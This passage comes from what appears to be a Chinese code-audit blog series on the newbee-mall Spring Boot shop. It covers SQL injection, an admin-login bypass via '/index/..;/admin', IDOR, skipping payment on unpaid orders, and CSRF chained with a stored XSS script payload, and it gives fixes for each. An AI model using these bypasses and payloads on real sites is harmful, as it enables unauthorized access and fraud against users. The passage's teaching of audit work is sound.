<p>同文件第三行，可以看到namespace为<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code></p>
<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:3</code></p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/mapper-namespace.png" alt="mapper-namespace"></p>
<p>找到<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code>，根据xml中的select id找到<code>findNewBeeMallGoodsList</code>和<code>findNewBeeMallGoodsListBySearch</code>这两个方法。</p>
<p><code>/src/main/java/ltd/newbee/mall/dao/NewBeeMallGoodsMapper.java</code></p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsMapper.png" alt="NewBeeMallGoodsMapper"></p>
<p>查看<code>findNewBeeMallGoodsListBySearch</code>方法的引用，追踪该处引用（Sublime将鼠标放在方法上可直接查看引用，IntelliJ IDEA可右键“Find Usages”或Option/Alt+F7查看引用）</p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/find-usages.png" alt="find-usages"></p>
<p>追踪到<code>searchNewBeeMallGoods</code>方法，这里是<code>Service</code>层，主要负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。当前类<code>NewBeeMallGoodsServiceImpl</code>中的Impl就是implement（实现）中的impl。</p>
<p>由于Service中都是接口，审计时一般直接查看<code>ServiceImpl</code>，忽视<code>Service</code>。</p>
<p><code>/src/main/java/ltd/newbee/mall/service/impl/NewBeeMallGoodsServiceImpl.java:73</code></p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsServiceImpl.png" alt="NewBeeMallGoodsServiceImpl"></p>
<p>再追踪<code>searchNewBeeMallGoods</code>方法引用，来到<code>searchPage</code>方法。这里是<code>Controller</code>层，负责业务模块流程的控制，获取用户传来的参数后调用<code>Service</code>层的接口来控制业务流程。</p>
<p>SpringBoot使用注解来控制URL路径，<code>searchNewBeeMallGoods</code>使用<code>@GetMapping({&quot;/search&quot;, &quot;/search.html&quot;})</code>表明接收来自<code>/search</code>或<code>/search.html</code>的get请求。</p>
<p><code>/src/main/java/ltd/newbee/mall/controller/mall/GoodsController.java:57</code></p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/GoodsController.png" alt="GoodsController"></p>
<p>从48行可以看到，<code>keyword</code>为字符串类型，可以传入任意字符。51行将<code>params.get(&quot;keyword&quot;)</code>中的值赋给<code>keyword</code>变量，仅做了非空判断。</p>
<p>其中if判断注释写着“去掉空格”，并不是将<code>keyword</code>参数中的空格去掉，而是去掉空格之后进行非空判断，不用考虑SQL注入绕过空格的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对keyword做过滤 去掉空格</span></span><br><span class="line"><span class="keyword">if</span> (params.containsKey(<span class="string">"keyword"</span>) &amp;&amp; !StringUtils.isEmpty((params.get(<span class="string">"keyword"</span>) + <span class="string">""</span>).trim()))</span><br></pre></td></tr></table></figure>



<p>整个参数追踪就到这，还有一个需要注意的地方就是看看应用中是否存在过滤器，过滤器是否会将特殊字符拦截。该应用没有针对SQL注入的过滤器，所以追踪完参数，可以确定该处SQL拼接存在注入漏洞。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SQL注入的审计，在Mapper中搜寻是否存在<code>${}</code>拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select</a></p>
<p><a href="https://segmentfault.com/a/1190000004617028" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004617028</a></p>
<p><a href="https://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/" target="_blank" rel="noopener">https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计五 - 越权</title>
    <url>/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/</url>
    <content><![CDATA[<p>越权分为三部分讲解：1. 未授权访问；2. 垂直越权；3. 水平越权</p>
<a id="more"></a>

<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><p>常见的控制有基于角色的访问控制和基于资源的访问控制。</p>
<p>基于角色的访问控制以角色为主体，以角色进行访问控制粒度较粗，可扩展性不强，不利于系统维护。</p>
<p>基于资源的访问控制以可访问的资源（简单说就是URL）为主体，可扩展性强，权限变动时容易更改。</p>
<p>Java中做角色控制的组件常见的有Apache shiro和Spring Security，它们将软件系统的安全认证相关的功能抽取出来，实现用户身份认证，权限授权、加密、会话管理等功能，组成了一个通用的安全认证框架。</p>
<p>Shiro使用广泛，shiro可以运行在web应用，非web应用，集群分布式应用中越来越多的用户使用shiro。Shiro相对独立，并且使用简单、灵活。</p>
<p>Spring Security(原名Acegi)也是一个开源的权限管理框架，spring security依赖spring运行。除了权限管理，它也有较多其他安全功能，体量较重，使用程度没有Shiro广泛，但它提供的安全防护能力是最全的。</p>
<p>案例项目仅使用interceptor（拦截器）根据URL路径做访问控制的，相对于使用成熟的框架，自写拦截器容易出现更多安全问题。</p>
<p>Interceptor配置在<code>/src/main/java/ltd/newbee/mall/config/NeeBeeMallWebMvcConfigurer.java</code>中，针对url路径设置了不同的interceptor。</p>
<p><code>addPathPatterns</code>表示其中的路径会经过设置的拦截器，<code>excludePathPatterns</code>则不过该拦截器。其中两个星<code>**</code>表示匹配任意字符，如果出现一个<code>*</code>则表示匹配单个路径</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/path-interceptor.png" alt="path-interceptor"></p>
<p>看到这里可能有同学会想，此处配置拦截器路径是否会存在绕过的可能性呢？</p>
<p>Spring中拦截器的分配是由<code>DispatcherServlet</code>来分配的，也就是根据<code>ServletPath</code>来分配路径，和<code>getRequestURI</code>无关，也就是不管怎么使用<code>../</code>来做路径穿越，最终得到的还是ServletPath。如果使用类似<code>%00</code>空字符进行截断路径，会使得<code>DispatcherServlet</code>无法将请求分配到正确的Controller，导致请求无效。</p>
<h2 id="管理员访问控制"><a href="#管理员访问控制" class="headerlink" title="管理员访问控制"></a>管理员访问控制</h2><p>先来看管理员的权限控制拦截器<code>AdminLoginInterceptor</code>。</p>
<p>第24行的if判断，若uri开头为<code>/admin</code>并且当前session中没有<code>loginUser</code>属性，则跳转到登录页面，注意这里uri是通过<code>getRequestURI()</code>获取的，关于该方法存在的问题可以查看 <a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a> 或 <a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">https://joychou.org/web/security-of-getRequestURI.html</a> </p>
<p><code>/src/main/java/ltd/newbee/mall/interceptor/AdminLoginInterceptor.java:24</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/AdminLoginInterceptor.png" alt="AdminLoginInterceptor"></p>
<p>在未登录的情况下，访问 <a href="http://localhost:8089/index/..;/admin" target="_blank" rel="noopener">http://localhost:8089/index/..;/admin</a> 可直接访问管理后台。此时<code>getRequestURI()</code>获取的值为<code>/index/..;/admin</code>，这样就绕过了<code>uri.startsWith(&quot;/admin&quot;)</code>的判断，使得if判断为假，不会跳转到登录页面。</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/AdminLoginInterceptor-Bypass.png" alt="AdminLoginInterceptor-Bypass"></p>
<p>我们对if判断进行调试，看到传入的uri为<code>/index/..;/admin/goods/list</code>，</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/debug-bypass-adminlogininterceptor1.png" alt="debug-bypass-adminlogininterceptor"></p>
<p>if判断条件为假，跳转到else语句中</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/debug-bypass-adminlogininterceptor2.png" alt="debug-bypass-adminlogininterceptor2"></p>
<p>没有cookie的请求中，成功查询到管理员页面中的商品信息</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/burp-request-bypass-adminlogininterceptor.png" alt="burp-request-bypass-adminlogininterceptor"></p>
<p>修复方法是将 <code>getRequestURI</code>改为<code>getServletPath()</code></p>
<p>再次调试，可以看到通过<code>getServletPath()</code>获取了正确的请求路径</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/mitigate-bypass-adminlogininterceptor.png" alt="mitigate-bypass-adminlogininterceptor"></p>
<p>此时再访问会返回302跳转到登录页面</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/burp-request-mitigated-adminlogininterceptor.png" alt="burp-request-mitigated-adminlogininterceptor"></p>
<h2 id="普通用户访问控制"><a href="#普通用户访问控制" class="headerlink" title="普通用户访问控制"></a>普通用户访问控制</h2><p>普通用户的访问控制就简单粗暴了，直接判断当前session中是否存在<code>newBeeMallUser</code>属性，也就是判断当前用户是否登录。</p>
<p><code>/src/main/java/ltd/newbee/mall/interceptor/NewBeeMallLoginInterceptor.java:24</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/NewBeeMallLoginInterceptor.png" alt="NewBeeMallLoginInterceptor"></p>
<p>这回不管用什么路径都无法绕过登录限制，因为请求对应的session中没有<code>MALL_USER_SESSION_KEY</code>的值。</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/try-to-bypass-newbeemalllogininterceptor.png" alt="NewBeeMallLoginInterceptor"></p>
<p>我们再回到拦截器的配置中来，看路径配置是否可能存在配置不当的情况，漏掉部分需要登录限制</p>
<img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/newbeemalllogininterceprot-config.png" alt="newbeemalllogininterceprot-config" style="zoom: 43%;">

<p>在Controller中一番搜寻，发现在<code>/src/main/java/ltd/newbee/mall/controller/mall/PersonalController.java:48</code>中，其中只有<code>/personal</code>和<code>/personal/updateInfo</code>设置了规则，而<code>/personal/addresses</code>未被配置拦截路径。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/personal/addresses"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addressesPage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"mall/addresses"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问发现该路径确实没有经过登录拦截器，但是作者没有配置<code>mall/addresses</code>模版，也就是说这里是个未开发的功能，尚未构成漏洞。但仍存在隐患，若日后开发新功能时没有及时修改拦截器中的配置，就会导致未授权访问。</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/burp-request-bypass-newbellmalllogininterceptor.png" alt="burp-request-bypass-newbellmalllogininterceptor"></p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>由于系统没有垂直权限的概念，管理员和普通用户都是独立存在的，管理员进行管理工作，普通用户进行购物、个人信息编辑操作。</p>
<p>这里简单说一下审计思路，审计时弄明白是基于角色还是基于资源做的权限控制还是根本就没做权限控制。再根据其配置内容去找是否存在错误配置的权限，和找权限控制本身是否存在绕过的可能性。</p>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>在开发时有一个原则是尽量从session中获取用户ID进行查询，这样会避免越权查询漏洞产生。</p>
<p>我们以查看「我的订单」为例，其中<code>user</code>对象直接从<code>httpSession</code>中获取，再将<code>user</code>中的<code>userId</code>传入后续步骤，最后在数据库中查询。这样一个过程用户侧是没法控制<code>userId</code>，使得该次数据库查询不可能越权。</p>
<p><code>/src/main/java/ltd/newbee/mall/controller/mall/OrderController.java:47</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/OrderController-orderListPage.png" alt="OrderController-orderListPage"></p>
<p>我们再来看个人信息修改，此时对数据库进行查询的是<code>mallUser.getUserId()</code>，而<code>mallUser</code>是从用户侧获取的，所以该处存在越权修改个人信息漏洞。</p>
<p><code>/src/main/java/ltd/newbee/mall/controller/mall/PersonalController.java:114</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/PersonController-updateInfo.png" alt="PersonController-updateInfo"></p>
<p><code>/src/main/java/ltd/newbee/mall/service/impl/NewBeeMallUserServiceImpl.java:73</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/NewBeeMallUserServiceImpl-updateUserInfo.png" alt="NewBeeMallUserServiceImpl-updateUserInfo"></p>
<p>修改<code>userId</code>的值即可更改任意用户的个人信息。</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/burp-request-updateInfo.png" alt="burp-request-updateInfo"></p>
<p>修改方案就是将<code>userId</code>从<code>httpSession</code>中获取，而不是不通过用户可控的<code>mallUser.getUserId</code>获取。</p>
<p>以上是查询信息一对一的情况，一对一可以直接通过session获取，而一对多的查询不行，比如查询某订单的情况，一名用户可能存在多个订单，此时就不能仅从session中获取id进行查询，订单号只能通过用户传入。</p>
<p>以订单查询为例，<code>OrderController.java</code>中第36行，有一行从Session中获取user的语句，第37行，存在<code>user.getUserId()</code>，是否说明此处会带入session获取到的<code>userId</code>一同查询呢？</p>
<p><code>/src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/OrderController-orderDetailPage.png" alt="OrderController-orderDetailPage"></p>
<p>我们继续跟入<code>newBeeMallOrderService.getOrderDetailByOrderNo()</code>，发现它直接使用orderNo进行查询，并没有代入从session中获取的<code>userId</code>，这真是欺骗感情啊！</p>
<p><code>/src/main/java/ltd/newbee/mall/service/impl/NewBeeMallOrderServiceImpl.java</code></p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/NewBeeMallOrderServiceImpl-getOrderDetailByOrderNo.png" alt="NewBeeMallOrderServiceImpl-getOrderDetailByOrderNo"></p>
<p>毫无疑问，此处仅通过用户传入的<code>orderNo</code>获取订单信息一定存在越权查询。</p>
<p>我们新建一个test1用户，查看「我的订单」，空空如也</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/new-user-test1.png" alt="new-user-test1"></p>
<p>通过test1访问他人的订单号，发现成功访问，可以看到订单细节</p>
<p><img src="/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/query-others-order-detail.png" alt="query-others-order-detail"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>表结构在设计之初应考虑订单和用户对应的关系，案例项目数据库订单表结构部分信息如下：</p>
<table>
<thead>
<tr>
<th>order_id</th>
<th>order_no</th>
<th>user_id</th>
<th>total_price</th>
<th>pay_status</th>
<th>pay_type</th>
<th>extra_info</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>15688187285093508</td>
<td>1</td>
<td>2492</td>
<td>1</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>15885800076852966</td>
<td>10</td>
<td>2245</td>
<td>1</td>
<td>1</td>
<td></td>
</tr>
</tbody></table>
<p>可以看到存在其中<code>order_no</code>和<code>user_id</code>存在对应关系，所以将<code>orderNo</code>和从session中获取的<code>userId</code>同时查询可解决越权问题。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * forom tb_newbee_mall_order <span class="keyword">where</span> order_no = <span class="comment">#&#123;orderNo,jdbcType=VARCHAR&#125; and user_id = #&#123;userId,jdbcType=LONG&#125; and is_deleted=0 limit 1</span></span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/icarusliu/article/details/78809790" target="_blank" rel="noopener">https://blog.csdn.net/icarusliu/article/details/78809790</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
<a id="more"></a>

<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">	NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">	String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">	<span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
<p>在管理页面确认该订单当前状态是待支付</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
<p>再次查看订单，已经交易成功</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
<p>在管理页面查看该订单，证明交易成功。</p>
<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计六 - CSRF</title>
    <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
    <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
<a id="more"></a>

<h1 id="CSRF代码审计过程"><a href="#CSRF代码审计过程" class="headerlink" title="CSRF代码审计过程"></a>CSRF代码审计过程</h1><p>案例项目中不存在Referer校验和CSRF token，所以网站肯定存在多处CSRF。除了修改密码处需要的原密码攻击者无法知晓外，其他功能点均存在CSRF。</p>
<p>我们以添加购物车功能为例，请求内容为下，没有任何token值</p>
<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/add-to-shop-cart.png" alt="add-to-shop-cart" style="zoom:43%;">



<p>由于是json格式的请求，不能直接使用burp Generate CSRF PoC，因为burp生成的PoC无法伪造Content-Type。burp生成的CSRF PoC请求内容如下，可以看到<code>Content-Type: text/plain</code>，并且post数据多出一个等号。</p>
<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/csrf-request-add-shop-cart.png" alt="csrf-request-add-shop-cart" style="zoom: 43%;">

<p>使用fetch跨域请求会先发送一个options请求，fetch设置no-cors模式又无法更改Content-Type。还有一种利用方法是使用flash+307跳转，这种方法只适用于老旧浏览器。</p>
<p>不过我们可以利用之前审计出来的漏洞组合起来利用。</p>
<p>首先我们通过未授权访问商品 <a href="http://localhost:8089/index/..;/admin/goods/edit/10896" target="_blank" rel="noopener">http://localhost:8089/index/..;/admin/goods/edit/10896</a></p>
<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/edit-goods.png" alt="edit-goods"></p>
<p>将商品详细信息改为，该<code>&lt;script&gt;</code>会发送添加商品10986到购物车的操作</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">const</span> authUrl = `http:<span class="comment">//localhost:8089/shop-cart`;</span></span></span><br><span class="line">	fetch(</span><br><span class="line">		authUrl,</span><br><span class="line">		&#123;</span><br><span class="line"><span class="actionscript">			method: <span class="string">'POST'</span>,</span></span><br><span class="line"><span class="actionscript">			credentials: <span class="string">'include'</span>,</span></span><br><span class="line">			headers: &#123;</span><br><span class="line"><span class="actionscript">				<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span></span><br><span class="line">			&#125;,</span><br><span class="line"><span class="actionscript">			body: <span class="string">'&#123;"goodsId":10896,"goodsCount":1&#125;'</span>,</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">	).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">throw</span> err;</span></span><br><span class="line"><span class="javascript">	&#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">	&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>因为富文本编辑器会将我们输入的内容编码，在保存过程中抓包，修改goodsDetailContent参数为XSS payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">\</span>"<span class="attr">text</span>/<span class="attr">javascript</span>\" <span class="attr">charset</span>=<span class="string">\</span>"<span class="attr">utf-8</span>\"&gt;</span><span class="javascript"><span class="keyword">const</span> authUrl=<span class="string">`http://localhost:8089/shop-cart`</span>;fetch(authUrl,&#123;<span class="attr">method</span>:<span class="string">'POST'</span>,<span class="attr">credentials</span>:<span class="string">'include'</span>,<span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>,<span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>&#125;,<span class="attr">body</span>:<span class="string">'&#123;\"goodsId\":10896,\"goodsCount\":1&#125;'</span>&#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;<span class="keyword">throw</span> err;&#125;).then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/update-xss-in-goods.png" alt="update-xss-in-goods"></p>
<p>每当用户访问10896这个商品时都会触发XSS，然后XSS执行CSRF请求，将该商品添加到购物车中</p>
<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/xss-combine-csrf.png" alt="xss-combine-csrf"></p>
<p>查看购物车，发现该商品在未经人工操作的情况下被进入购物车。我们甚至还可以再添加结算和下订单操作，直接等待用户付款。</p>
<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/auto-add-goods-in-shop-cart.png" alt="auto-add-goods-in-shop-cart"></p>
<h1 id="CSRF修复"><a href="#CSRF修复" class="headerlink" title="CSRF修复"></a>CSRF修复</h1><h2 id="校验Referer"><a href="#校验Referer" class="headerlink" title="校验Referer"></a>校验Referer</h2><p>Spring中可以使用interceptor来校验Referer，以下代码为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> AntPathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> RefererProperties properties;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String referer = req.getHeader(<span class="string">"referer"</span>);</span><br><span class="line">		String host = req.getServerName();</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">"POST"</span>.equals(req.getMethod())) &#123;  <span class="comment">// 只验证POST请求</span></span><br><span class="line">			<span class="keyword">if</span> (referer == <span class="keyword">null</span>) &#123; <span class="comment">//若referer为空</span></span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">//返回403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; </span><br><span class="line">			java.net.URL url = <span class="keyword">null</span>;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				url = <span class="keyword">new</span> java.net.URL(referer);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">// URL解析异常，也置为403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!host.equals(url.getHost())) &#123;  <span class="comment">// 首先判断请求域名和referer域名是否相同</span></span><br><span class="line">				<span class="keyword">if</span> (properties.getRefererDomain() != <span class="keyword">null</span>) &#123;  <span class="comment">// 如果不等，判断是否在白名单中</span></span><br><span class="line">					<span class="keyword">for</span> (String s : properties.getRefererDomain()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (s.equals(url.getHost())) &#123;</span><br><span class="line">							<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="给cookie设置SameSite属性"><a href="#给cookie设置SameSite属性" class="headerlink" title="给cookie设置SameSite属性"></a>给cookie设置SameSite属性</h2><p>关于SameSite属性可参考 <a href="https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieServiceInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, 